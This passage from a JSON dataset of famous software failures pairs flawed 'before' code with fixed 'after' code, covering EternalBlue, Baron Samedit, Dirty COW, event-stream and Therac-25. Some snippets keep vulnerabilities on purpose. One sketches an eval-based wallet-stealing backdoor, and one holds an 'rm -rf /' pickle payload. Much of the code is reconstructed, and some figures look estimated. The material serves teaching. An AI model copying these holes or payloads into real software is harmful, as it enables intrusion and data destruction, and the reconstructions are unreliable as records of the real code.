      "after_code": "NTSTATUS SrvOs2FeaListToNt(\n    PFEALIST Os2FeaList,\n    PFILE_FULL_EA_INFORMATION *NtFeaList,\n    PULONG NtFeaListSize  /* FIX: Use ULONG not USHORT */\n) {\n    ULONG os2_fea_size;\n    ULONG total_size = 0;  /* FIX: Use ULONG */\n    \n    while (remaining > 0) {\n        os2_fea_size = Os2Fea->cbName + Os2Fea->cbValue + 5;\n        \n        /* FIX: Check for overflow before adding */\n        if (total_size > MAXULONG - os2_fea_size) {\n            return STATUS_INVALID_PARAMETER;\n        }\n        total_size = total_size + os2_fea_size;\n        \n        /* FIX: Validate against maximum allowed size */\n        if (total_size > MAX_FEA_LIST_SIZE) {\n            return STATUS_INVALID_PARAMETER;\n        }\n        \n        Os2Fea = (PFEALIST)((PCHAR)Os2Fea + os2_fea_size);\n    }\n    \n    *NtFeaList = ExAllocatePoolWithTag(PagedPool, total_size, 'LFrS');\n}",
      "language": "C",
      "file_path": "srv.sys (Windows SMB driver)",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "security",
      "root_cause": "buffer_overflow",
      "complexity_score": 10,
      "deaths": 0,
      "financial_loss_usd": 8000000000,
      "affected_systems": 300000,
      "project": "Windows SMBv1",
      "year": 2017,
      "description": "A buffer overflow in Windows SMB protocol allowed remote code execution. Used by WannaCry ransomware to infect 300k+ computers in 150 countries."
    },
    {
      "id": "baron_samedit_2021",
      "name": "sudo Baron Samedit",
      "cve": "CVE-2021-3156",
      "before_code": "static int set_cmnd(void)\n{\n    char *to, *from, *user_args;\n    size_t size, len;\n\n    /* Escape special characters in arguments */\n    from = user_args;\n    while (*from) {\n        if (*from == '\\\\' && *(from + 1) == '\\\\') {\n            /* BUG: Backslash at end of string */\n            /* from+1 could be null terminator */\n            *to++ = *from++;  /* Copy first backslash */\n            *to++ = *from++;  /* Copy second - may be past buffer! */\n        } else if (*from == '\\\\') {\n            from++;  /* Skip single backslash */\n            if (*from)\n                *to++ = *from++;  /* Heap overflow here */\n        } else {\n            *to++ = *from++;\n        }\n    }\n    *to = '\\0';\n}",
      "after_code": "static int set_cmnd(void)\n{\n    char *to, *from, *user_args;\n    size_t size, len;\n\n    /* Escape special characters in arguments */\n    from = user_args;\n    while (*from) {\n        if (*from == '\\\\') {\n            from++;  /* Skip backslash */\n            /* FIX: Check for end of string before accessing */\n            if (*from == '\\0')\n                break;  /* Don't read past null terminator */\n            /* Only copy if we have a valid character */\n            *to++ = *from++;\n        } else {\n            *to++ = *from++;\n        }\n    }\n    *to = '\\0';\n}",
      "language": "C",
      "file_path": "src/sudoers.c",
      "commit_introducing": null,
      "commit_fixing": "1fbec0531c83ec3a67cbeec20c6e3cb79a0c45ad",
      "category": "security",
      "root_cause": "heap_buffer_overflow",
      "complexity_score": 9,
      "deaths": 0,
      "financial_loss_usd": 300000000,
      "affected_systems": 200000000,
      "project": "sudo",
      "year": 2021,
      "description": "A heap-based buffer overflow in sudo's argument parsing allowed any local user to gain root privileges without authentication. Present for 10 years.",
      "repo_url": "https://github.com/sudo-project/sudo"
    },
    {
      "id": "event_stream_2018",
      "name": "event-stream Supply Chain Attack",
      "cve": "n/a",
      "before_code": "var Stream = require('stream').Stream;\nmodule.exports = function (opts) {\n  // Innocuous-looking stream wrapper\n  return through(function (data) {\n    this.queue(data);\n  });\n};\n\n// Hidden in minified dependency:\n// Decrypts and executes payload only in Copay wallet context\nvar r = require, s = 'AES';\nvar p = Buffer.from('...', 'hex');\nif (process.env.npm_package_name === 'copay') {\n  // Steal wallet credentials\n  var d = r('crypto').createDecipher(s, p);\n  var c = d.update(payload, 'hex', 'utf8');\n  eval(c);  // Execute credential theft code\n}",
      "after_code": "var Stream = require('stream').Stream;\n\n// Use well-maintained, audited packages\n// Pin dependency versions explicitly\n// Use npm audit and lockfiles\n\nmodule.exports = function (opts) {\n  // Simple passthrough stream - no hidden code\n  return through(function (data) {\n    this.queue(data);\n  });\n};\n\n// No eval(), no crypto payload, no environment checks\n// Auditable, minimal code",
      "language": "JavaScript",
      "file_path": "index.js (flatmap-stream)",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "security",
      "root_cause": "supply_chain_attack",
      "complexity_score": 9,
      "deaths": 0,
      "financial_loss_usd": 50000000,
      "affected_systems": 8000000,
      "project": "event-stream (npm)",
      "year": 2018,
      "description": "A malicious maintainer added a backdoor to steal cryptocurrency wallet credentials from the Copay Bitcoin wallet app via a deeply nested dependency."
    },
    {
      "id": "jackson_databind_rce_2017",
      "name": "Jackson Databind Deserialization RCE",
      "cve": "CVE-2017-7525",
      "before_code": "public class ObjectMapper {\n    // BUG: When default typing is enabled, attacker controls class instantiation\n    \n    public ObjectMapper enableDefaultTyping() {\n        // Allows: {\"@class\": \"com.sun.rowset.JdbcRowSetImpl\", ...}\n        // JdbcRowSetImpl connects to attacker JNDI server = RCE!\n        _typeFactory = _typeFactory.withDefaultTyping();\n        return this;\n    }\n    \n    public <T> T readValue(String json, Class<T> valueType) {\n        // Deserializes to arbitrary class specified in @class field!\n        return _readValue(json, valueType);\n    }\n}",
      "after_code": "public class ObjectMapper {\n    // FIX: Blocklist dangerous classes\n    private static final Set<String> BLOCKED_CLASSES = Set.of(\n        \"com.sun.rowset.JdbcRowSetImpl\",\n        \"org.springframework.context.support.ClassPathXmlApplicationContext\",\n        \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"\n        // ... extensive blocklist\n    );\n    \n    @Deprecated  // FIX: Deprecate unsafe API\n    public ObjectMapper enableDefaultTyping() {\n        throw new UnsupportedOperationException(\n            \"Use activateDefaultTyping with explicit PolymorphicTypeValidator\"\n        );\n    }\n    \n    // FIX: Require explicit type validation\n    public ObjectMapper activateDefaultTyping(PolymorphicTypeValidator validator) {\n        _typeFactory = _typeFactory.withValidator(validator);\n        return this;\n    }\n}",
      "language": "Java",
      "file_path": "src/main/java/com/fasterxml/jackson/databind/ObjectMapper.java",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "security",
      "root_cause": "unsafe_deserialization",
      "complexity_score": 7,
      "deaths": 0,
      "financial_loss_usd": 200000000,
      "affected_systems": 50000000,
      "project": "Jackson Databind",
      "year": 2017,
      "description": "Jackson databind library allowed polymorphic deserialization of untrusted JSON, enabling attackers to instantiate arbitrary classes and achieve RCE."
    },
    {
      "id": "django_sql_injection_2022",
      "name": "Django SQL Injection via Trunc/Extract",
      "cve": "CVE-2022-34265",
      "before_code": "class TruncBase(Transform):\n    def as_sql(self, compiler, connection):\n        # BUG: kind is used directly in SQL without validation\n        sql = connection.ops.datetime_trunc_sql(\n            self.kind,  # User-controlled, not sanitized!\n            inner_sql,\n            tzname,\n        )\n        return sql, params",
      "after_code": "class TruncBase(Transform):\n    # FIX: Whitelist allowed values\n    allowed_kinds = {'year', 'quarter', 'month', 'week', 'day', 'hour', 'minute', 'second'}\n    \n    def as_sql(self, compiler, connection):\n        if self.kind not in self.allowed_kinds:\n            raise ValueError(f\"Invalid kind: {self.kind}\")\n        sql = connection.ops.datetime_trunc_sql(\n            self.kind,\n            inner_sql,\n            tzname,\n        )\n        return sql, params",
      "language": "Python",
      "file_path": "django/db/models/functions/datetime.py",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "security",
      "root_cause": "sql_injection",
      "complexity_score": 7,
      "deaths": 0,
      "financial_loss_usd": 50000000,
      "affected_systems": 1000000,
      "project": "Django",
      "year": 2022,
      "description": "SQL injection vulnerability in Django's Trunc() and Extract() database functions when using untrusted data as kind/lookup_name."
    },
    {
      "id": "tse_2005",
      "name": "Tokyo Stock Exchange J-Com Incident",
      "cve": "n/a",
      "before_code": "int validate_order(Order *order) {\n    /* Check basic limits */\n    if (order->quantity > MAX_ORDER_SIZE) {\n        return ERROR_QUANTITY_TOO_LARGE;\n    }\n    if (order->price < 0) {\n        return ERROR_INVALID_PRICE;\n    }\n    \n    /* BUG: No check for obviously erroneous orders */\n    /* \u00a51 price for any stock should be flagged */\n    /* 610,000 shares of new IPO (only 14,500 exist) */\n    \n    /* BUG: Cancel system was also broken */\n    /* Multiple cancel attempts were ignored */\n    \n    return ORDER_VALID;  /* Accepts insane order */\n}",
      "after_code": "int validate_order(Order *order, Stock *stock) {\n    /* Check basic limits */\n    if (order->quantity > MAX_ORDER_SIZE) {\n        return ERROR_QUANTITY_TOO_LARGE;\n    }\n    if (order->price < 0) {\n        return ERROR_INVALID_PRICE;\n    }\n    \n    /* FIX: Sanity checks for obviously erroneous orders */\n    if (order->quantity > stock->shares_outstanding * 0.5) {\n        return ERROR_QUANTITY_EXCEEDS_FLOAT;\n    }\n    if (order->price < stock->last_price * 0.01) {\n        /* Price is 99%+ below last price - likely error */\n        return ERROR_PRICE_SUSPICIOUSLY_LOW;\n    }\n    \n    /* FIX: Require confirmation for large orders */\n    if (order->total_value > LARGE_ORDER_THRESHOLD) {\n        return REQUIRES_CONFIRMATION;\n    }\n    \n    return ORDER_VALID;\n}",
      "language": "Unknown",
      "file_path": "order_validation.c (reconstructed)",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "financial",
      "root_cause": "input_validation_failure",
      "complexity_score": 4,
      "deaths": 0,
      "financial_loss_usd": 347000000,
      "affected_systems": 1,
      "project": "Mizuho Securities Trading System",
      "year": 2005,
      "description": "A trader intended to sell 1 share at \u00a5610,000 but accidentally entered 610,000 shares at \u00a51. The system should have rejected this but a bug allowed it through."
    },
    {
      "id": "patriot_1991",
      "name": "Patriot Missile Failure (Dhahran)",
      "cve": "n/a",
      "before_code": "; Patriot System Time Calculation\n; Time stored as 24-bit integer (0.1 second units)\n; Converted to seconds by multiplying by 0.1\n\n; BUG: 0.1 cannot be exactly represented in binary\n; 0.1 decimal = 0.00011001100110011... binary (repeating)\n; Truncated to 24 bits: 0.00011001100110011001100\n; Error per 0.1s: 0.0000000095 seconds\n\nCALC_TIME:\n    ; Load internal time counter (tenths of seconds)\n    MOV R0, [TIME_COUNTER]\n    \n    ; Multiply by 0.1 to get seconds\n    ; BUG: Uses truncated 24-bit representation\n    MUL R0, POINT_ONE_TRUNCATED\n    \n    ; After 100 hours:\n    ; 100 * 60 * 60 * 10 = 3,600,000 ticks\n    ; Error = 3,600,000 * 0.0000000095 = 0.34 seconds\n    ; 0.34 seconds * 1676 m/s (Scud speed) = 573 meters off",
      "after_code": "; Fixed Patriot System Time Calculation\n; Use higher precision or periodic resync\n\nCALC_TIME:\n    ; FIX Option 1: Use higher precision representation\n    ; Use 48-bit or 64-bit floating point\n    MOV R0, [TIME_COUNTER]\n    MUL64 R0, POINT_ONE_HIGH_PRECISION\n    \n    ; FIX Option 2: Periodic recalibration\n    ; Reset time counter every few hours\n    CMP [HOURS_RUNNING], MAX_SAFE_HOURS\n    JGE RECALIBRATE\n    \n    ; FIX Option 3: Reboot requirement\n    ; Document maximum safe operating time\n    ; Require system restart before 8 hours\n\nRECALIBRATE:\n    ; Sync with external time source\n    CALL EXTERNAL_TIME_SYNC\n    MOV [TIME_COUNTER], 0",
      "language": "Assembly",
      "file_path": "time_calc.asm (reconstructed)",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "death",
      "root_cause": "floating_point_accumulation",
      "complexity_score": 8,
      "deaths": 28,
      "financial_loss_usd": 100000000,
      "affected_systems": 1,
      "project": "Patriot Missile System",
      "year": 1991,
      "description": "A floating-point rounding error in the Patriot missile system's time calculation caused it to miss an incoming Scud missile, resulting in 28 American soldiers killed."
    },
    {
      "id": "dirty_cow_2016",
      "name": "Linux Dirty COW",
      "cve": "CVE-2016-5195",
      "before_code": "static struct page *follow_page_pte(struct vm_area_struct *vma,\n        unsigned long address, pmd_t *pmd, unsigned int flags)\n{\n    pte_t *ptep, pte;\n    spinlock_t *ptl;\n    struct page *page;\n\nretry:\n    ptep = pte_offset_map_lock(mm, pmd, address, &ptl);\n    pte = *ptep;\n    if (!pte_present(pte)) {\n        /* ... */\n    }\n    if ((flags & FOLL_WRITE) && !pte_write(pte)) {\n        /* The page is not writable, try to handle COW */\n        if (!can_follow_write_pte(pte, flags)) {\n            pte_unmap_unlock(ptep, ptl);\n            return NULL;  /* Race window here! */\n        }\n    }\n    /* Between check and use, another thread can modify */\n    page = vm_normal_page(vma, address, pte);\n    /* ... */\n}",
      "after_code": "static struct page *follow_page_pte(struct vm_area_struct *vma,\n        unsigned long address, pmd_t *pmd, unsigned int flags)\n{\n    pte_t *ptep, pte;\n    spinlock_t *ptl;\n    struct page *page;\n\nretry:\n    ptep = pte_offset_map_lock(mm, pmd, address, &ptl);\n    pte = *ptep;\n    if (!pte_present(pte)) {\n        /* ... */\n    }\n    if ((flags & FOLL_WRITE) && !pte_write(pte)) {\n        /* Add FOLL_COW flag to track COW break status */\n        if (!can_follow_write_pte(pte, flags)) {\n            pte_unmap_unlock(ptep, ptl);\n            return NULL;\n        }\n        /* FOLL_FORCE breaks COW but retries need FOLL_COW */\n        if (flags & FOLL_FORCE)\n            flags |= FOLL_COW;\n    }\n    page = vm_normal_page(vma, address, pte);\n    /* ... */\n}",
      "language": "C",
      "file_path": "mm/gup.c",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "security",
      "root_cause": "race_condition",
      "complexity_score": 9,
      "deaths": 0,
      "financial_loss_usd": 300000000,
      "affected_systems": 1000000000,
      "project": "Linux Kernel",
      "year": 2016,
      "description": "A race condition in the Linux kernel's memory subsystem allowed unprivileged local users to gain write access to read-only memory mappings, enabling privilege escalation to root.",
      "repo_url": "https://github.com/torvalds/linux"
    },
    {
      "id": "lodash_prototype_pollution_2019",
      "name": "Lodash Prototype Pollution",
      "cve": "CVE-2019-10744",
      "before_code": "function baseMergeDeep(object, source, key) {\n    // BUG: No check for __proto__ or constructor.prototype\n    var objValue = object[key];\n    var srcValue = source[key];\n    \n    // If key is '__proto__', this pollutes Object.prototype!\n    if (isObject(srcValue)) {\n        object[key] = baseMergeDeep(objValue || {}, srcValue);\n    } else {\n        object[key] = srcValue;\n    }\n}",
      "after_code": "function baseMergeDeep(object, source, key) {\n    // FIX: Block prototype pollution vectors\n    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {\n        return;  // Skip dangerous keys\n    }\n    \n    var objValue = object[key];\n    var srcValue = source[key];\n    \n    if (isObject(srcValue)) {\n        object[key] = baseMergeDeep(objValue || {}, srcValue);\n    } else {\n        object[key] = srcValue;\n    }\n}",
      "language": "JavaScript",
      "file_path": "lodash.js",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "security",
      "root_cause": "prototype_pollution",
      "complexity_score": 7,
      "deaths": 0,
      "financial_loss_usd": 100000000,
      "affected_systems": 50000000,
      "project": "Lodash",
      "year": 2019,
      "description": "Prototype pollution vulnerability in lodash's defaultsDeep function allows attackers to modify Object.prototype, affecting all objects in the application."
    },
    {
      "id": "crowdstrike_falcon_2024",
      "name": "CrowdStrike Falcon Sensor Update",
      "cve": null,
      "before_code": "// CrowdStrike Falcon Sensor - Channel File Processing\n// The bug was in how content update files were parsed\n\nstruct ChannelFile291 {\n    // Template Type definitions\n    // Expected 20 input fields, update provided 21\n    uint32_t field_count;  // Should be 20, was 21\n    TemplateField fields[20];  // Fixed array size based on IPC Template Type\n};\n\nvoid process_channel_file(const uint8_t* content, size_t length) {\n    ChannelFile291* cf = parse_channel_header(content);\n    \n    // CATASTROPHIC BUG: Content Validator passed file with 21 fields\n    // but the Template Type only defined 20 fields\n    \n    for (int i = 0; i < cf->field_count; i++) {\n        // When i == 20, this accesses fields[20]\n        // But fields array only has indices 0-19\n        // OUT-OF-BOUNDS READ!\n        \n        process_field(&cf->fields[i]);\n        \n        // Reading beyond array bounds in kernel mode\n        // Accesses garbage memory\n        // Causes page fault or invalid pointer dereference\n        // Result: SYSTEM_THREAD_EXCEPTION_NOT_HANDLED\n        // Blue Screen of Death (BSOD)\n    }\n}\n\n// The Content Validator should have caught this:\nbool validate_channel_file(const ChannelFile291* cf) {\n    // BUG: Validator checked field_count matched template...\n    // But there was a bug in the validator logic itself!\n    // It allowed the mismatch to pass\n    \n    // A logic error in the Content Validator allowed the problematic\n    // content to pass validation and be deployed to production\n    \n    if (cf->field_count != EXPECTED_FIELD_COUNT) {\n        // This SHOULD have returned false\n        // But due to a bug, it didn't\n        return false;  // Never reached due to validator bug\n    }\n    return true;\n}\n\n// Why it spread so fast:\n// - Falcon runs at kernel level (Ring 0) for maximum protection\n// - Kernel crashes = entire system crashes\n// - Content updates are pushed automatically\n// - No gradual rollout - all systems got update at once\n// - Update deployed on Friday = maximum impact before anyone could respond",
      "after_code": "// Fixed Channel File Processing\n\nvoid process_channel_file(const uint8_t* content, size_t length) {\n    ChannelFile291* cf = parse_channel_header(content);\n    \n    // FIX 1: Explicit bounds checking\n    if (cf->field_count > MAX_ALLOWED_FIELDS) {\n        log_error(\"Channel file field count exceeds maximum\");\n        return;\n    }\n    \n    // FIX 2: Check against actual array size\n    if (cf->field_count > sizeof(cf->fields) / sizeof(cf->fields[0])) {\n        log_error(\"Field count exceeds array bounds\");\n        report_content_error(cf);\n        return;\n    }\n    \n    // FIX 3: Use validated count, not file-provided count\n    size_t safe_count = min(cf->field_count, TEMPLATE_FIELD_COUNT);\n    \n    for (int i = 0; i < safe_count; i++) {\n        process_field(&cf->fields[i]);\n    }\n}\n\n// FIX 4: Enhanced Content Validator with additional checks\nbool validate_channel_file(const ChannelFile291* cf) {\n    // Multiple validation stages\n    \n    // Stage 1: Field count matches template\n    if (cf->field_count != EXPECTED_FIELD_COUNT) {\n        log_validation_failure(\"Field count mismatch\");\n        return false;\n    }\n    \n    // Stage 2: Bounds check\n    if (cf->field_count > ARRAY_SIZE(cf->fields)) {\n        log_validation_failure(\"Field count exceeds array\");\n        return false;\n    }\n    \n    // Stage 3: Content integrity check\n    if (!verify_content_signature(cf)) {\n        log_validation_failure(\"Signature verification failed\");\n        return false;\n    }\n    \n    return true;\n}\n\n// FIX 5: Staged rollout process\nvoid deploy_content_update(ContentUpdate* update) {\n    // Canary deployment: 1% of systems first\n    deploy_to_canary_group(update);\n    wait_and_monitor(CANARY_OBSERVATION_PERIOD);\n    \n    if (check_canary_health() < CANARY_HEALTH_THRESHOLD) {\n        rollback_canary(update);\n        alert_engineering(\"Canary failed\");\n        return;\n    }\n    \n    // Gradual rollout: 10%, 25%, 50%, 100%\n    for (int pct : {10, 25, 50, 100}) {\n        deploy_to_percentage(update, pct);\n        wait_and_monitor(ROLLOUT_OBSERVATION_PERIOD);\n        \n        if (check_fleet_health() < FLEET_HEALTH_THRESHOLD) {\n            pause_rollout(update);\n            alert_engineering(\"Fleet health degraded\");\n            return;\n        }\n    }\n}",
      "language": "C/C++",
      "file_path": "falcon/sensor/content_interpreter.c",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "service_outage",
      "root_cause": "out_of_bounds_read",
      "complexity_score": 7,
      "deaths": 0,
      "financial_loss_usd": 10000000000,
      "affected_systems": 8500000,
      "project": "CrowdStrike Falcon Sensor",
      "year": 2024,
      "description": "A faulty content update to CrowdStrike's Falcon Sensor caused approximately 8.5 million Windows systems worldwide to crash with a Blue Screen of Death (BSOD). The outage affected airlines, hospitals, banks, and government agencies globally, causing an estimated $5-10 billion in damages."
    },
    {
      "id": "mars_climate_1999",
      "name": "Mars Climate Orbiter",
      "cve": "n/a",
      "before_code": "C Lockheed Martin ground software\nC Outputs thrust in pound-force-seconds (lbf\u00b7s)\n      SUBROUTINE CALC_THRUST(IMPULSE)\n      REAL IMPULSE\n      \nC     Calculate impulse from thruster firings\n      IMPULSE = THRUST * DURATION\n      \nC     BUG: Output is in pound-force-seconds\nC     But interface spec says newton-seconds!\nC     1 lbf = 4.44822 N\n      \nC     Calling code expects metric units\n      CALL SEND_TO_SPACECRAFT(IMPULSE)\n      \n      RETURN\n      END",
      "after_code": "C Fixed version with explicit unit conversion\n      SUBROUTINE CALC_THRUST(IMPULSE_NS)\n      REAL IMPULSE_LBF, IMPULSE_NS\n      REAL, PARAMETER :: LBF_TO_N = 4.44822\n      \nC     Calculate impulse in native units (lbf\u00b7s)\n      IMPULSE_LBF = THRUST * DURATION\n      \nC     FIX: Convert to newton-seconds per interface spec\n      IMPULSE_NS = IMPULSE_LBF * LBF_TO_N\n      \nC     Document the units clearly\nC     @units: newton-seconds (N\u00b7s)\n      CALL SEND_TO_SPACECRAFT(IMPULSE_NS)\n      \n      RETURN\n      END",
      "language": "Fortran",
      "file_path": "SM_FORCES (ground software)",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "financial",
      "root_cause": "unit_conversion_error",
      "complexity_score": 3,
      "deaths": 0,
      "financial_loss_usd": 327600000,
      "affected_systems": 1,
      "project": "NASA Mars Climate Orbiter",
      "year": 1999,
      "description": "The Mars Climate Orbiter was destroyed because one software component provided thrust data in pound-force-seconds while another expected newton-seconds."
    },
    {
      "id": "knight_capital_2012",
      "name": "Knight Capital SMARS Deployment Bug",
      "cve": null,
      "before_code": "// Knight Capital SMARS (Smart Market Access Routing System)\n// Reconstructed from SEC filing descriptions\n\nclass OrderRouter {\n    // CATASTROPHIC ISSUE: Old code reused a flag name for new feature\n    bool POWER_PEG_ENABLED;  // OLD: Test code that buys stock repeatedly\n                              // NEW: Flag for new Retail Liquidity Program\n    \n    void route_order(Order& order) {\n        if (POWER_PEG_ENABLED) {\n            // OLD CODE (should have been removed):\n            // This was TEST functionality that accumulated positions\n            // It was supposed to be dead code!\n            \n            // BUG: When the flag was repurposed and set to true,\n            // this old code path was reactivated\n            execute_power_peg_strategy(order);\n            // Power Peg would:\n            // 1. Receive parent order\n            // 2. Execute child orders\n            // 3. Accumulate position instead of maintaining market-neutral\n            // 4. KEEP BUYING even when not intended\n        } else {\n            // Normal routing path\n            execute_normal_routing(order);\n        }\n    }\n    \n    void execute_power_peg_strategy(Order& order) {\n        // This code assumed it was in TEST mode\n        // It would aggressively buy/sell to accumulate a position\n        // In production, this caused massive unintended trades\n        \n        while (order.remaining_quantity > 0) {\n            // Send child order immediately\n            send_market_order(order.symbol, order.side, CHILD_ORDER_SIZE);\n            \n            // BUG: Should check fill status before continuing\n            // Instead, keeps sending orders regardless\n            // No position limit check!\n            // No exposure limit check!\n            \n            order.remaining_quantity -= CHILD_ORDER_SIZE;\n        }\n        \n        // After parent is \"done\", positions are NOT netted\n        // Company ends up with massive directional exposure\n    }\n};\n\n// DEPLOYMENT ISSUE:\n// 1. New RLP code required POWER_PEG_ENABLED = true\n// 2. Deployment script was supposed to install new code on all 8 servers\n// 3. Script failed to deploy to 1 of 8 servers\n// 4. That server still had OLD code with Power Peg test logic\n// 5. When flag was set to true, old server executed Power Peg\n// 6. 7 servers did normal RLP, 1 server went haywire",
      "after_code": "class OrderRouter {\n    // FIX 1: Separate flags for different features\n    bool RETAIL_LIQUIDITY_ENABLED;  // New feature\n    // Power Peg code REMOVED entirely\n    \n    // FIX 2: Position and exposure limits\n    static const int64_t MAX_NET_POSITION = 10000000;  // $10M\n    static const int64_t MAX_ORDERS_PER_MINUTE = 10000;\n    \n    int64_t current_net_position = 0;\n    int orders_this_minute = 0;\n    \n    void route_order(Order& order) {\n        // FIX 3: Check limits before any order\n        if (abs(current_net_position) > MAX_NET_POSITION) {\n            log_error(\"POSITION LIMIT EXCEEDED - HALTING\");\n            emergency_stop();\n            return;\n        }\n        \n        if (orders_this_minute > MAX_ORDERS_PER_MINUTE) {\n            log_error(\"ORDER RATE LIMIT EXCEEDED\");\n            throttle_orders();\n            return;\n        }\n        \n        // FIX 4: Dead code removed, only new feature remains\n        if (RETAIL_LIQUIDITY_ENABLED) {\n            execute_rlp_routing(order);\n        } else {\n            execute_normal_routing(order);\n        }\n        \n        // FIX 5: Track position changes\n        update_position_tracking(order);\n    }\n};\n\n// FIX 6: Deployment verification\n// - All servers must report same code version before trading starts\n// - Deployment script verifies 100% success before enabling\n// - Canary deployment: test on 1 server before full rollout",
      "language": "Unknown (likely C++/Java)",
      "file_path": "smars/order_router.cpp",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "financial",
      "root_cause": "deployment_error",
      "complexity_score": 7,
      "deaths": 0,
      "financial_loss_usd": 440000000,
      "affected_systems": 1,
      "project": "Knight Capital SMARS Trading System",
      "year": 2012,
      "description": "Knight Capital's automated trading system executed 4 million trades in 45 minutes due to a deployment error that reactivated old test code. The company lost $440 million and nearly went bankrupt, eventually being acquired by Getco."
    },
    {
      "id": "python_pickle_rce",
      "name": "Python Pickle Deserialization (Generic)",
      "cve": "CWE-502",
      "before_code": "import pickle\nimport base64\n\ndef load_user_data(request):\n    # BUG: Unpickling user-controlled data = instant RCE\n    \n    user_data = request.POST.get('data')\n    decoded = base64.b64decode(user_data)\n    \n    # Attacker sends pickle payload that executes:\n    # __reduce__: (os.system, ('rm -rf /',))\n    obj = pickle.loads(decoded)  # BOOM! RCE\n    \n    return render(request, 'profile.html', {'data': obj})",
      "after_code": "import json  # FIX: Use safe format\n# import pickle  # REMOVED - never use with untrusted data\n\ndef load_user_data(request):\n    # FIX: Use JSON or other safe format\n    user_data = request.POST.get('data')\n    \n    try:\n        obj = json.loads(user_data)  # Safe - no code execution\n    except json.JSONDecodeError:\n        return HttpResponse('Invalid data', status=400)\n    \n    # FIX: If pickle is truly needed, use hmac signature\n    # verified_data = verify_signed_pickle(user_data, SECRET_KEY)\n    \n    return render(request, 'profile.html', {'data': obj})",
      "language": "Python",
      "file_path": "app/views.py",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "security",
      "root_cause": "unsafe_deserialization",
      "complexity_score": 4,
      "deaths": 0,
      "financial_loss_usd": 100000000,
      "affected_systems": 10000000,
      "project": "Python Standard Library",
      "year": 2010,
      "description": "Python's pickle module can deserialize arbitrary objects, allowing code execution. Any application that unpickles user data is vulnerable to RCE."
    },
    {
      "id": "stagefright_2015",
      "name": "Android Stagefright",
      "cve": "CVE-2015-1538",
      "before_code": "status_t MPEG4Extractor::parseSampleSizeTable(off64_t data_offset) {\n    uint32_t sample_count;\n    uint32_t sample_size;\n    \n    if (!mDataSource->getUInt32(data_offset, &sample_size)) {\n        return ERROR_IO;\n    }\n    if (!mDataSource->getUInt32(data_offset + 4, &sample_count)) {\n        return ERROR_IO;\n    }\n    \n    /* BUG: Integer overflow in multiplication */\n    size_t alloc_size = sample_count * sizeof(uint32_t);\n    /* If sample_count is large, alloc_size wraps to small value */\n    \n    mSampleSizes = new uint32_t[alloc_size / sizeof(uint32_t)];\n    \n    /* Later writes overflow the small buffer */\n    for (uint32_t i = 0; i < sample_count; i++) {\n        mSampleSizes[i] = readSampleSize(i);  /* HEAP OVERFLOW */\n    }\n}",
      "after_code": "status_t MPEG4Extractor::parseSampleSizeTable(off64_t data_offset) {\n    uint32_t sample_count;\n    uint32_t sample_size;\n    \n    if (!mDataSource->getUInt32(data_offset, &sample_size)) {\n        return ERROR_IO;\n    }\n    if (!mDataSource->getUInt32(data_offset + 4, &sample_count)) {\n        return ERROR_IO;\n    }\n    \n    /* FIX: Check for overflow before allocation */\n    if (sample_count > SIZE_MAX / sizeof(uint32_t)) {\n        return ERROR_MALFORMED;  /* Reject oversized input */\n    }\n    \n    size_t alloc_size = sample_count * sizeof(uint32_t);\n    /* Additional sanity check */\n    if (alloc_size > MAX_SAMPLE_TABLE_SIZE) {\n        return ERROR_MALFORMED;\n    }\n    \n    mSampleSizes = new (std::nothrow) uint32_t[sample_count];\n    if (mSampleSizes == nullptr) {\n        return ERROR_MALFORMED;\n    }\n    /* ... */\n}",
      "language": "C++",
      "file_path": "frameworks/av/media/libstagefright/MPEG4Extractor.cpp",
      "commit_introducing": null,
      "commit_fixing": null,
      "category": "security",
      "root_cause": "integer_overflow",
      "complexity_score": 8,
      "deaths": 0,
      "financial_loss_usd": 500000000,
      "affected_systems": 950000000,
      "project": "Android libstagefright",
      "year": 2015,
      "description": "Multiple integer overflow vulnerabilities in Android's media processing library allowed remote code execution via a malicious MMS message - no user interaction required."
    },
    {
      "id": "therac25_race_condition",
      "name": "Therac-25 Race Condition",
      "cve": null,
      "before_code": "; Therac-25 Mode Selection Handler (reconstructed)\n; CATASTROPHIC BUG: No hardware interlocks, race condition in software\n\nMODE_SELECT:\n    ; Read operator's mode selection from keyboard\n    CALL READ_KEYBOARD\n    STORE MODE_REQUESTED\n    \n    ; Start positioning turntable for selected mode\n    ; BUG: This runs asynchronously!\n    CALL BEGIN_TURNTABLE_ROTATION\n    \n    ; Check if mode change is complete\n    ; BUG: Uses shared variable without synchronization!\nCHECK_READY:\n    LOAD TURNTABLE_POSITION\n    COMPARE EXPECTED_POSITION\n    JUMP_NE CHECK_READY     ; Busy wait\n    \n    SET BEAM_READY_FLAG     ; Signal beam can fire\n    RETURN\n\n; Meanwhile, in the keyboard handler (runs on interrupt):\nKEYBOARD_HANDLER:\n    ; If operator quickly types X then E (changing X-ray to Electron)\n    ; within 8 seconds, this can run WHILE turntable is still moving\n    LOAD KEYSTROKE\n    COMPARE 'E'             ; Electron mode\n    JUMP_EQ SET_ELECTRON_POWER\n    ; ... other key handling\n\nSET_ELECTRON_POWER:\n    ; BUG: Sets high power without checking if turntable has X-ray filter!\n    LOAD HIGH_POWER_ELECTRON\n    STORE BEAM_POWER        ; 25 MeV instead of 200 rads!\n    RETURN\n\n; RACE CONDITION:\n; 1. Operator selects X-ray mode, turntable starts moving to X-ray position\n; 2. Operator quickly changes to Electron mode (within 8 seconds)\n; 3. Power is set to high electron power (25 MeV)\n; 4. But turntable hasn't finished moving - X-ray target still in place!\n; 5. BEAM_READY_FLAG set because check happened before mode change\n; 6. Patient receives 25 MeV electron beam with no spreading - LETHAL DOSE",
